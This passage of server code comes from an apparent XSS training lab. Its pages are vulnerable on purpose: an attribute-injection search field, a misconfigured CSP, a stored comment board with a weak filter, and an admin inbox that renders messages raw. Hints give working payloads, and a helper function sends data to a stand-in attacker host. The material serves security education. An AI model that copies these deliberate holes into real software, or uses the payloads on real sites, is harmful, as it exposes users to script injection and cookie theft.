  res.send(`<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>No Brackets XSS | Hunt Labs</title>
<link rel="stylesheet" href="/assets/style.css">
<script>
function captureFlag() {
  fetch('/api/capture/lab14', {method:'POST'})
    .then(r=>r.json()).then(d=>{
      document.getElementById('flag-result').textContent = 'FLAG: ' + d.flag;
      document.getElementById('flag-result').style.display='block';
    });
}
</script>
</head><body>
<nav class="nav"><div class="nav-inner"><a href="/" class="nav-logo">[ HUNT ]</a>
<div class="nav-links"><a href="/">Hub</a><a href="/lab14" class="active">Lab 14</a></div></div></nav>
<div class="page"><div class="lab-page">
<div class="lab-main">
<div class="lab-header">
<div class="lab-header-badges"><span class="badge badge-lab">LAB 14</span><span class="badge badge-intermediate">Intermediate</span></div>
<h1>Filter Bypass — No Angle Brackets</h1>
</div>
<div class="panel"><div class="panel-body">
<div id="flag-result" class="alert alert-success" style="display:none;"></div>
<p>Search for a product. Filter: <code>&lt;</code> and <code>&gt;</code> are HTML-encoded. Quotes pass through.</p>
<form method="GET" style="display:flex;gap:8px;margin-bottom:16px;">
<input name="q" class="flag-input" style="flex:1;" placeholder="Search products…">
<button type="submit" class="btn btn-primary">Search</button>
</form>
<div style="margin-top:16px;">
<label style="font-size:13px;color:var(--text-muted);">Search result field:</label><br>
<input value="${q}" class="flag-input" style="width:100%;margin-top:6px;">
</div>
</div></div>
</div>
<div class="lab-sidebar">
<div class="panel"><div class="panel-header"><span class="panel-title">Submit Flag</span></div>
<div class="panel-body">
<form class="flag-form" id="flag-form"><input type="text" class="flag-input" id="flag-input" placeholder="HUNT{...}">
<button type="submit" class="btn btn-primary btn-full">Submit</button></form>
<div id="flag-alert" class="alert"></div>
</div></div>
<div class="panel"><div class="panel-header"><span class="panel-title">Hints</span></div>
<div class="panel-body"><div class="hints-list">
<div class="hint-item" data-hint="1"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#1</span><span>No new tags</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content">You can't open new HTML tags — angle brackets are encoded. But you're already inside an existing element's attribute.</div></div>
<div class="hint-item" data-hint="2"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#2</span><span>Quotes survive</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content">If quotes aren't encoded, you can close the current attribute value and add a new attribute — like an event handler — without needing angle brackets.</div></div>
<div class="hint-item" data-hint="3"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#3</span><span>The payload</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content">Try <code>" onmouseover=captureFlag() x="</code> — closes the value, injects a handler, then opens a dummy attribute to swallow the trailing quote. Hover over the field.</div></div>
</div></div></div>
</div>
</div></div>
<script src="/assets/main.js"></script>
<script>
const LAB_ID = 'lab14';
const EXPECTED_FLAG = '${FLAGS.lab14}';
document.addEventListener('DOMContentLoaded', () => { HuntLabs.initFlagForm(LAB_ID, EXPECTED_FLAG); });
</script>
</body></html>`);
});

// ── Lab 15 — Mutation XSS (mXSS) ──────────────────────────────────────
app.get('/lab15', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'lab15.html'));
});

// ── Lab 16 — React dangerouslySetInnerHTML ────────────────────────────
app.get('/lab16', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'lab16.html'));
});

// ── Lab 17 — Vue v-html ───────────────────────────────────────────────
app.get('/lab17', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'lab17.html'));
});

// ── Lab 18 — Angular bypassSecurityTrustHtml ──────────────────────────
app.get('/lab18', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'lab18.html'));
});

// ── Lab 19 — CSP Bypass ───────────────────────────────────────────────
app.get('/lab19', (req, res) => {
  const q = req.query.q || '';
  // VULNERABLE: unsafe-inline in CSP defeats its purpose; also allows localhost:3001 (JSONP endpoint there)
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'unsafe-inline' http://localhost:3001; style-src 'self' 'unsafe-inline'; img-src *;");
  res.send(`<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>CSP Bypass | Hunt Labs XSS</title>
<link rel="stylesheet" href="/assets/style.css">
</head><body>
<nav class="nav"><div class="nav-inner"><a href="/" class="nav-logo">[ HUNT ]</a>
<div class="nav-links"><a href="/">Hub</a><a href="/lab19" class="active">Lab 19</a></div></div></nav>
<div class="page"><div class="lab-page">
<div class="lab-main">
<div class="lab-header">
<div class="lab-header-badges"><span class="badge badge-lab">LAB 19</span><span class="badge badge-advanced">Advanced</span></div>
<h1>CSP Bypass</h1>
</div>
<div class="panel"><div class="panel-body">
<p>This page has a Content-Security-Policy, but it's misconfigured. Bypass it and execute code.</p>
<div id="flag-result" class="alert alert-success" style="display:none;"></div>
<form method="GET" style="display:flex;gap:8px;margin-bottom:16px;">
<input name="q" class="flag-input" style="flex:1;" placeholder="Inject your payload…">
<button type="submit" class="btn btn-primary">Search</button>
</form>
<div class="panel"><div class="panel-body">
<p style="font-size:12px;color:var(--text-muted);">Active CSP header:</p>
<pre><code>Content-Security-Policy:
  default-src 'self';
  script-src 'self' <span style="color:var(--red);">'unsafe-inline'</span> http://localhost:3001;
  style-src 'self' 'unsafe-inline';
  img-src *;</code></pre>
</div></div>
<div class="search-results"><p>Results for: ${q}</p></div>
</div></div>
</div>
<div class="lab-sidebar">
<div class="panel"><div class="panel-header"><span class="panel-title">Submit Flag</span></div>
<div class="panel-body">
<form class="flag-form" id="flag-form"><input type="text" class="flag-input" id="flag-input" placeholder="HUNT{...}">
<button type="submit" class="btn btn-primary btn-full">Submit</button></form>
<div id="flag-alert" class="alert"></div>
</div></div>
<div class="panel"><div class="panel-header"><span class="panel-title">Hints</span></div>
<div class="panel-body"><div class="hints-list">
<div class="hint-item" data-hint="1"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#1</span><span>Read the CSP carefully</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content">Look at the <code>script-src</code> directive. One keyword completely nullifies the CSP's protection against inline scripts.</div></div>
<div class="hint-item" data-hint="2"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#2</span><span>unsafe-inline</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content"><code>'unsafe-inline'</code> allows any inline <code>&lt;script&gt;</code> or event handler — the CSP still blocks external scripts, but inline code runs freely.</div></div>
<div class="hint-item" data-hint="3"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#3</span><span>Or use the allowlisted origin</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content">The attacker origin <code>http://localhost:3001</code> is allowed to serve scripts. Visit <a href="http://localhost:3001/lab19-jsonp?callback=captureFlag19" target="_blank">the JSONP endpoint</a> there, then load it via <code>&lt;script src="http://localhost:3001/lab19-jsonp?callback=captureFlag19"&gt;</code></div></div>
</div></div></div>
</div>
</div></div>
<script>
function captureFlag19() {
  fetch('/api/capture/lab19', {method:'POST'})
    .then(r=>r.json()).then(d=>{
      document.getElementById('flag-result').textContent = 'FLAG: ' + d.flag;
      document.getElementById('flag-result').style.display='block';
    });
}
</script>
<script src="/assets/main.js"></script>
<script>
const LAB_ID = 'lab19';
const EXPECTED_FLAG = '${FLAGS.lab19}';
document.addEventListener('DOMContentLoaded', () => { HuntLabs.initFlagForm(LAB_ID, EXPECTED_FLAG); });
</script>
</body></html>`);
});

// ── Lab 20 — Capstone ─────────────────────────────────────────────────
app.get('/lab20', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'lab20.html'));
});

// Lab 20: search (reflected, safe)
app.get('/lab20/search', (req, res) => {
  const q = (req.query.q || '').replace(/[<>"']/g, c => ({'<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
  res.json({ results: [`No results for: ${q}`] });
});

// Lab 20: profile (safe)
app.get('/lab20/profile', (req, res) => {
  res.json({ username: req.session.user || 'visitor', role: req.session.role || 'user' });
});

// Lab 20: comment board (stored, vulnerable — light filter, weak CSP)
app.get('/lab20/comments', (req, res) => {
  res.setHeader('Content-Security-Policy', "script-src 'self' 'unsafe-inline'; img-src *;");
  const commentsHtml = lab20Comments.map(c => `<div class="comment-item"><strong>${c.user}:</strong> ${c.text}</div>`).join('') || '<p style="color:var(--text-muted);">No posts yet.</p>';
  res.send(`<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Community Board | Hunt Labs</title>
<link rel="stylesheet" href="/assets/style.css">
<script>
function sendToAttacker(data) {
  fetch('http://localhost:3001/log', {method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({lab:'lab20', data})
  });
}
</script>
</head><body>
<nav class="nav"><div class="nav-inner"><a href="/lab20" class="nav-logo">[ HUNT ]</a></div></nav>
<div class="page"><h2>Community Board</h2>
${commentsHtml}
</div></body></html>`);
});

app.post('/lab20/comment', (req, res) => {
  let text = req.body.text || '';
  // VULNERABLE: light filter only removes <script> — other vectors pass
  text = text.replace(/<script[\s\S]*?>[\s\S]*?<\/script>/gi, '');
  if (text) lab20Comments.push({ user: req.session.user || 'visitor', text, ts: new Date().toISOString() });
  res.json({ ok: true });
});

// Lab 20: inbox (admin reads these — all raw, no filter)
app.post('/lab20/message', (req, res) => {
  const { to, text } = req.body;
  if (text) lab20Messages.push({ from: req.session.user || 'visitor', to: to || 'admin', text, ts: new Date().toISOString() });
  res.json({ ok: true });
});

// Lab 20: admin inbox — visited by bot, renders messages raw
app.get('/lab20/admin', (req, res) => {
  const isAdmin = req.cookies.admin_token === ADMIN_SESSION_SECRET;
  const adminFlag = isAdmin ? FLAGS.lab20 : 'not-admin';
  res.cookie('admin_flag', adminFlag, { httpOnly: false }); // deliberately httpOnly=false for the lab
  const msgsHtml = lab20Messages.map(m => `<div style="padding:12px;border:1px solid var(--border);margin-bottom:8px;border-radius:6px;"><strong>From ${m.from}:</strong> ${m.text}</div>`).join('') || '<p>No messages.</p>';
  res.send(`<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Admin</title><link rel="stylesheet" href="/assets/style.css">
<script>const ADMIN_FLAG = '${adminFlag}';</script>
</head><body><div class="page"><h1>Admin Inbox</h1>${msgsHtml}</div></body></html>`);
});

// ── Start ──────────────────────────────────────────────────────────────
app.listen(3000, () => console.log('[victim] http://localhost:3000'));
